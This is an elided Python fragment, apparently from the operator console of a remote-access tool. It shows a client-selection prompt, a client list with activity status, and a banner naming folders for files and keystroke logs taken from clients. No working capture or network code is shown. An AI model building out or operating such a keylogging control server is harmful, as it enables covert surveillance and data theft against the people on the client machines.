...
def cli_interface():
    ...
    while True:
        try:
            ...
            if current_client:
                prompt = f"\n[{current_client[:20]}...]> " if len(current_client) > 20 else f"\n[{current_client}]> "
            else:
                prompt = "\n> "
            ...
            if cmd == "list":
                ...
                if not client_list:
                    ...
                    for i, client_id in enumerate(client_list):
                        ...
                        if time_diff < 60:
                            status = f"🟢 Active ({int(time_diff)}s ago)"
                        elif time_diff < 300:
                            status = f"🟡 Idle ({int(time_diff/60)}m ago)"
                        else:
                            status = f"🔴 Inactive ({int(time_diff/60)}m ago)"
...
if __name__ == "__main__":
    ...
    print("\nDirectory Structure:")
    print(f"  📁 received_files/  - Files received from clients")
    print(f"  📁 keylogs/         - Keystroke logs from clients")
    print(f"  📁 uploads/         - Files to send to clients")
    print("="*60)
